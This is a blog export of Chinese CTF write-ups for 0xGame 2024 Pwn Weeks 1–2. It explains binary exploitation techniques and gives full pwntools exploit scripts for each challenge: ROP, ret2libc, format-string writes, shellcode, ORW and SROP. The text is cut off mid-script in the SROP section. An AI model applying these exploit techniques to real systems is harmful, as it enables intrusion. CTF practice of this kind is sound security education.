<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0xGame2024-Week1-Pwn</title>
    <url>/2025/12/21/0xGame2024-Week1/</url>
    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame-Week1-Pwn"></a>0xGame-Week1-Pwn</h1><h2 id="1-Stackoverflow"><a href="#1-Stackoverflow" class="headerlink" title="1.Stackoverflow"></a>1.Stackoverflow</h2><p>就是一道简单的栈溢出。要考虑栈对齐的问题，不过直接控制执行流到0x4012DD就可以直接getshell，不用考虑栈平衡了。</p>
<p><img src="/images/24week1.1-1.png" alt="ida"></p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012dd</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span> *<span class="number">0x28</span> + p64(backdoor)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her:&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2-Positive"><a href="#2-Positive" class="headerlink" title="2.Positive"></a>2.Positive</h2><p><img src="/images/24week1.2-1.png" alt="ida"></p>
<p>可以看出来，这里有一个无符号数转化，也就是存在整数溢出。所以我们只要输入bytes为-1，就可以得到一个较大的输入长度。然后就可以按照ret2text去做了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor =  <span class="number">0x401272</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walk:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;walking:&#x27;</span>)</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(backdoor)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="3-Find-me"><a href="#3-Find-me" class="headerlink" title="3.Find_me"></a>3.Find_me</h2><p><img src="/images/24week1.3-1.png" alt="main"></p>
<p>这是一道关于fd的题目。</p>
<p>fd，文件描述符。每打开一个文件便会加1。stdin（标准输入）– 0；stdout（标准输出）–1；stderr（标准错误输出）–2；后面我们打开的文件的fd就依次+1。既从3开始。</p>
<p>ida里可以看出，这里是为随机。所以我们可以调用ctypes库 ，来撞i_1的值。那么fd的值就应该是i_1+3。由于 这里把标准输出关了，所以可以采用stderr来输出flag。</p>
<p><img src="/images/24week1.3-2.png" alt="do_bad"></p>
<p>可以看到，这里的fd是我们自己写入的（伪随机可以得到flag的fd）。那么我们就可以通过先向what地址读入flag，再写出what地址里存放的内容，也就是flag。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.srand(libc.time(<span class="number">0</span>))</span><br><span class="line">fd = libc.rand() % <span class="number">100</span> + <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;fd=&#x27;</span>,fd)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;dolls ?&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(fd))</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="4-Where-is-my-binsh"><a href="#4-Where-is-my-binsh" class="headerlink" title="4.Where_is_my_binsh"></a>4.Where_is_my_binsh</h2><p>一个正常的ret2rop的打法。开头输入&#x2F;bin&#x2F;sh在bss段。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;create it:&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> </span><br><span class="line">io.send(pl1)</span><br><span class="line">bss = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x401323</span></span><br><span class="line">sys = <span class="number">0x401090</span></span><br><span class="line">ret = <span class="number">0x4012b5</span></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ret) + p64(rdi) + p64(bss) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;now ?&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="5-Ret2csu"><a href="#5-Ret2csu" class="headerlink" title="5.Ret2csu"></a>5.Ret2csu</h2><p><img src="/images/24week1.5-1.png" alt="main"></p>
<p>可以看出来，和上一题有相似之处，也可以输入&#x2F;bin&#x2F;sh到bss段。注意的是，这里有strlen绕过。也就是说我们可以把\x00当作padding来绕过。然后这里ret2csu的技巧就不多说了，可以看blog里有一篇关于ret2csu的基本用法，关键是对各个寄存器的值的控制。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;her~\n&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x4010e0</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;do?\n&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x404098</span></span><br><span class="line">binsh = <span class="number">0x404090</span></span><br><span class="line">rdi = <span class="number">0x4013c3</span></span><br><span class="line">gadget1 = <span class="number">0x4013BA</span></span><br><span class="line">gadget2 = <span class="number">0x4013a0</span></span><br><span class="line">rbx = <span class="number">0</span></span><br><span class="line">rbp = <span class="number">1</span></span><br><span class="line">r12 = binsh</span><br><span class="line">r13 = <span class="number">0</span></span><br><span class="line">r14 = <span class="number">0</span></span><br><span class="line">r15 = bss</span><br><span class="line">pl2 = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) + p64(gadget2)</span><br><span class="line"><span class="comment">#binsh_addr pop ---&gt; rdi; call r15 ---&gt; call bss ---&gt; call execve</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>由于打的是本地，还有两道题需要用dockerfile，就先鸽着了QAQ。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>0xGame2024-Week2-Pwn</title>
    <url>/2025/12/21/0xGame2024-Week2/</url>
    <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame-Week2-Pwn"></a>0xGame-Week2-Pwn</h1><h2 id="1-Boom"><a href="#1-Boom" class="headerlink" title="1.Boom"></a>1.Boom</h2><p>根据题目就可以简单推测是一道爆破题。</p>
<p><img src="/images/24week2.1-1.png" alt="ida"></p>
<p>可以看出，这里只需要满足我们输入的buf和secret相同就可以。可以这里的secret在bss段上，而我们填入的buf在栈上，读取长度也不够溢出，还没有格式化字符串漏洞，那我们该怎么办呢？</p>
<p>这里的漏洞在strcmp上，由于strcmp有\x00截断的特性，所以我们可以赌随机数secret的第一位是\x00，就可以打通了。（init函数里可以看出secret是一个真随机数）</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;thinking?&#x27;</span>)</span><br><span class="line">    io.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;gift.&#x27;</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure>



<h2 id="2-Fmt"><a href="#2-Fmt" class="headerlink" title="2.Fmt"></a>2.Fmt</h2><p><img src="/images/24week2.2-1.png" alt="checksec"></p>
<p>可以看出来保护基本都全开了。</p>
<p><img src="/images/24week2.2-2.png" alt="ida"></p>
<p>可以看出，我们读取了flag文件的内容到flag地址（bss段）。那么也就是说，我们只要能够知道flag地址的真实地址（pie保护），就可以通过格式化字符串漏洞，将flag的内容输出。</p>
<p>所以我们需要去泄露程序的基址。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;something:&#x27;</span>)</span><br><span class="line">pl1 = <span class="string">b&#x27;%9$p&#x27;</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pro_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">success(<span class="built_in">hex</span>(pro_base))</span><br><span class="line">flag = pro_base + <span class="number">0x40c0</span></span><br><span class="line">pl2  = <span class="string">b&#x27;%7$s%7$s&#x27;</span> + p64(flag)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;something:&#x27;</span>)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里可以通过数据测试，读出offest &#x3D; 6，然后通过gdb动调（记得换依赖）读出在9的偏移处存在_start的地址，从而可以获取pro_base。</p>
<p><img src="/images/24week2.2-3.png" alt="gdb"></p>
<p>这里写入%7$s%7$s是在offset &#x3D; 6 处的位置，所以flag的地址自然偏移量就是7。这里用了两个%7$s是为了保持我们填入的p64(flag)刚好就是在偏移7的位置。</p>
<h2 id="3-Ret2libc"><a href="#3-Ret2libc" class="headerlink" title="3.Ret2libc"></a>3.Ret2libc</h2><p>一道很典型的ret2libc。这里就不过多赘述。详细做法详见25年week2的wp。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">rdi = <span class="number">0x4012c3</span></span><br><span class="line">ret = <span class="number">0x401235</span></span><br><span class="line">vuln = elf.sym.vuln</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;libc ?&#x27;</span>)</span><br><span class="line">io.send(pl1)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;libc ?&#x27;</span>)</span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="4-Shellcode-lv0"><a href="#4-Shellcode-lv0" class="headerlink" title="4.Shellcode-lv0"></a>4.Shellcode-lv0</h2><p><img src="/images/24week2.4-1.png" alt="ida"><br>可以看出这里给buf可执行权限，最后又去call了buf。所以只要我们向buf上填入shellcode，就可以实现getshell。不过这里去对256取模了，所以我们不知道它具体call的是buf上的哪的地址。这时候就可以想到用nop的方式，使执行流慢慢滑到我们写入的shellcode的地方。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;run: &#x27;</span>)</span><br><span class="line">pl = asm(shellcraft.sh())</span><br><span class="line">pl = pl.rjust(<span class="number">0x100</span>,<span class="string">b&#x27;\x90&#x27;</span>)<span class="comment">#nop</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>做完看wp，才知道出题人实际想把nop给ban了，但是好像并不彻底。那我们可以用\x91，也就是<code>xchg eax,ecx</code>来将eax清零。所以实际上，只要不影响程序经行的指令都可以称作nop，这里都可以用来填充。</p>
<h2 id="5-Shellcode-lv1"><a href="#5-Shellcode-lv1" class="headerlink" title="5.Shellcode-lv1"></a>5.Shellcode-lv1</h2><p>这里相对于lv0，多增加了一个沙箱。我们可以看一下这里的沙箱做了什么。</p>
<p><img src="/images/24week2.5-1.png" alt="sandbox"></p>
<p>可以看出execve和execveat都被过滤掉了。也就是说open，read，write都是允许的。这里就是所谓的orw。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;run: &#x27;</span>)</span><br><span class="line">shell = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>,<span class="number">0</span>,<span class="number">0</span>) + shellcraft.read(<span class="number">3</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">0x100</span>)</span><br><span class="line">pl = asm(shell).rjust(<span class="number">0x100</span>,<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>可以看出和lv0的差别不大，不过这里是把shellcraft.sh()的指令换成了open，read，write，后续是一样的。</p>
<h2 id="6-Fmt-shellcode"><a href="#6-Fmt-shellcode" class="headerlink" title="6.Fmt+shellcode"></a>6.Fmt+shellcode</h2><p><img src="/images/24week2.6-1.png" alt="ida"></p>
<p>可以看出这里给0x114514000的地址可执行权限，后面还call了0x114514000。所以我们只需要往这个地址里写入shellcode就可以getshell了。那么就要保证key的值是26318864。这里就可以用格式化字符串漏洞来修改key的值了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;something:&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;%9$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">pro_base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1140</span></span><br><span class="line">success(<span class="built_in">hex</span>(pro_base))</span><br><span class="line">key = <span class="number">0x4068</span> + pro_base <span class="comment">#0x191 9180</span></span><br><span class="line"></span><br><span class="line">pl1 = <span class="string">b&#x27;%38928c&#x27;</span>+<span class="string">b&#x27;%8$hn&#x27;</span><span class="comment">#gdb + 双字节写入 ---&gt;\x80 \x91</span></span><br><span class="line">pl1 = pl1.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(key)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;something:&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;%401c&#x27;</span> + <span class="string">b&#x27;%8$hn&#x27;</span> <span class="comment">#---&gt;\x91 \x01</span></span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(key+<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;something:&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;something:&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(<span class="string">b&#x27;stop\x00&#x27;</span>)<span class="comment">#退出循环，call函数</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;say!&#x27;</span>)</span><br><span class="line">pl3 = asm(shellcraft.sh())</span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="7-Syscall"><a href="#7-Syscall" class="headerlink" title="7.Syscall"></a>7.Syscall</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n3; <span class="comment">// [rsp+8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> sysno; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i_1; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> avail_buffer; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  __int64 s; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  bufinit();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Prepare a buffer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Recycle a buffer&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Initiate a syscall with glibc wrapper&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n3);</span><br><span class="line">    <span class="keyword">if</span> ( n3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Now I will initiate a syscall with glibc wrapper&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Which syscall do you want to call: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;sysno);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Input the arguments count: &quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i_1);</span><br><span class="line">      s = <span class="number">0LL</span>;</span><br><span class="line">      v10 = <span class="number">0LL</span>;</span><br><span class="line">      v11 = <span class="number">0LL</span>;</span><br><span class="line">      v12 = <span class="number">0LL</span>;</span><br><span class="line">      v13 = <span class="number">0LL</span>;</span><br><span class="line">      v14 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x30u</span>LL);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)i_1; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input the argument %d: &quot;</span>, i);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;s + i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Initating syscall %d with %d arguments\n&quot;</span>, sysno, i_1);</span><br><span class="line">      v7 = syscall(sysno, s, v10, v11, v12, v13, v14);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Syscall returned with code %d\n&quot;</span>, v7);</span><br><span class="line">LABEL_18:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n3 &gt; <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( n3 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        avail_buffer = find_avail_buffer();</span><br><span class="line">        <span class="keyword">if</span> ( avail_buffer == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;No available buffer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          buffers[avail_buffer] = <span class="built_in">malloc</span>(<span class="number">0x400u</span>LL);</span><br><span class="line">          <span class="built_in">printf</span>(</span><br><span class="line">            <span class="string">&quot;Buffer %d is prepared. Size: %d, located at %p\n&quot;</span>,</span><br><span class="line">            avail_buffer,</span><br><span class="line">            <span class="number">1024</span>,</span><br><span class="line">            (<span class="type">const</span> <span class="type">void</span> *)buffers[avail_buffer]);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Input your data: &quot;</span>);</span><br><span class="line">          read(<span class="number">0</span>, (<span class="type">void</span> *)buffers[avail_buffer], <span class="number">0x400u</span>LL);</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Data is stored&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n3 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Which buffer do you want to recycle: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i_1);</span><br><span class="line">        <span class="keyword">if</span> ( i_1 &lt;= <span class="number">5</span> &amp;&amp; buffers[i_1] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">free</span>((<span class="type">void</span> *)buffers[i_1]);</span><br><span class="line">          buffers[i_1] = <span class="number">0LL</span>;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Buffer %d is recycled\n&quot;</span>, i_1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid buffer&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很有意思的一道题，就相当于把syscall教学了一遍。</p>
<p>我们可以通过创建一块缓存区，然后向这块缓存区里放入&#x2F;bin&#x2F;sh，而且buf的地址是给我们的。然后对这块buf进行初始化。可以通过我们的输入，控制系统调用号，参数个数，各个参数对应的寄存器的取值。不难，但是要静态分析程序在做什么。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">rdi = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(rdi))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;data: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;choice: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;call: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;59&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;count: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rsi = <span class="string">b&#x27;0&#x27;</span></span><br><span class="line">rdx = <span class="string">b&#x27;0&#x27;</span></span><br><span class="line">rdi = <span class="built_in">str</span>(rdi)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [rdi,rsi,rdx]:</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>,i)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="8-Srop"><a href="#8-Srop" class="headerlink" title="8.Srop"></a>8.Srop</h2><p><img src="/images/24week2.8-1.png" alt="ida"></p>
<p>可以看这里调用了sys_read和sys_write函数，所以考虑srop的打法。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">syscall_ret = <span class="number">0x40100a</span></span><br><span class="line">s1 = SigreturnFrame()</span><br><span class="line">s1.rax = <span class="number">0</span></span><br><span class="line">s1.rdi = <span class="number">0</span></span><br><span class="line">s1.rsi = <span class="number">0x402800</span> <span class="comment">#data</span></span><br><span class="line">s1.rdx = <span class="number">0x1000</span></span><br><span class="line">s1.rip = syscall_ret</span><br><span class="line">s1.rsp = <span class="number">0x402800</span></span><br><span class="line"></span><br><span class="line">pl1 = <span 